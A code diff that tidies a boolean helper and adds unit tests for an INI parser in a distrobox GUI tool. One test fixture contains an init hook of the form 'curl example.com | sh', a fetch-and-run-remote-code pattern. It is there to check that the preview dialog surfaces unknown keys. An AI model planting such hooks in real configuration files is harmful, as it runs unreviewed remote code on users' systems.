@@ -615,10 +615,7 @@ pub fn parse_assemble_ini(contents: &str) -> Vec<IniBoxSection> {
 /// `true`, `yes`, `1`, `on` (case-insensitive). Anything else - including a
 /// missing key - is treated as `false`.
 fn parse_bool(value: &str) -> bool {
-    matches!(
-        value.to_lowercase().as_str(),
-        "true" | "yes" | "1" | "on"
-    )
+    matches!(value.to_lowercase().as_str(), "true" | "yes" | "1" | "on")
 }
 
 /// Grabs the list of available images via `distrobox create -C`.
@@ -1026,5 +1023,91 @@ mod stream_tests {
         let exists = get_all_distroboxes().iter().any(|b| b.name == name);
         let _ = delete_box(name);
         assert!(exists, "streaming create did not produce a listable box");
+    }
+}
+
+#[cfg(test)]
+mod ini_preview_tests {
+    use super::parse_assemble_ini;
+
+    #[test]
+    fn parses_a_single_section() {
+        let ini = "[dev]\nimage=docker.io/library/ubuntu:24.04\nadditional_packages=\"git vim\"\ninit=true\n";
+        let s = parse_assemble_ini(ini);
+        assert_eq!(s.len(), 1);
+        assert_eq!(s[0].name, "dev");
+        assert_eq!(
+            s[0].image.as_deref(),
+            Some("docker.io/library/ubuntu:24.04")
+        );
+        assert_eq!(s[0].additional_packages.as_deref(), Some("git vim"));
+        assert!(s[0].init);
+        assert!(!s[0].nvidia);
+        assert!(s[0].extra_keys.is_empty());
+    }
+
+    #[test]
+    fn parses_multiple_sections() {
+        let ini = "[a]\nimage=alpine\n\n[b]\nimage=fedora\nnvidia=true\n";
+        let s = parse_assemble_ini(ini);
+        assert_eq!(s.len(), 2);
+        assert_eq!(s[0].name, "a");
+        assert_eq!(s[1].name, "b");
+        assert!(s[1].nvidia);
+    }
+
+    /// The whole point of the preview: keys BoxBuddy has no field for must
+    /// still be captured, so the dialog can show them rather than hiding
+    /// what the file will actually do.
+    #[test]
+    fn keeps_unknown_keys_verbatim() {
+        let ini = "[x]\nimage=ubuntu\npull=true\ninit_hooks=curl example.com | sh\n";
+        let s = parse_assemble_ini(ini);
+        assert_eq!(s[0].extra_keys.len(), 2);
+        assert!(s[0]
+            .extra_keys
+            .contains(&("pull".to_string(), "true".to_string())));
+        assert!(s[0].extra_keys.contains(&(
+            "init_hooks".to_string(),
+            "curl example.com | sh".to_string()
+        )));
+    }
+
+    #[test]
+    fn skips_comments_blank_lines_and_junk() {
+        let ini = "# a comment\n; another\n[d]\n\nnonsense-without-equals\nimage=debian\n";
+        let s = parse_assemble_ini(ini);
+        assert_eq!(s.len(), 1);
+        assert_eq!(s[0].image.as_deref(), Some("debian"));
+        assert!(s[0].extra_keys.is_empty());
+    }
+
+    #[test]
+    fn recognises_various_truthy_spellings() {
+        for v in ["true", "yes", "1", "on", "TRUE", "On"] {
+            let ini = format!("[s]\nimage=i\ninit={v}\n");
+            assert!(parse_assemble_ini(&ini)[0].init, "init={v} should be true");
+        }
+        for v in ["false", "no", "0", "off", ""] {
+            let ini = format!("[s]\nimage=i\ninit={v}\n");
+            assert!(
+                !parse_assemble_ini(&ini)[0].init,
+                "init={v} should be false"
+            );
+        }
+    }
+
+    #[test]
+    fn keys_before_any_section_are_ignored() {
+        let ini = "image=orphan\n[real]\nimage=ubuntu\n";
+        let s = parse_assemble_ini(ini);
+        assert_eq!(s.len(), 1);
+        assert_eq!(s[0].name, "real");
+    }
+
+    #[test]
+    fn empty_input_yields_no_sections() {
+        assert!(parse_assemble_ini("").is_empty());
+        assert!(parse_assemble_ini("# just a comment\n").is_empty());
     }
 }
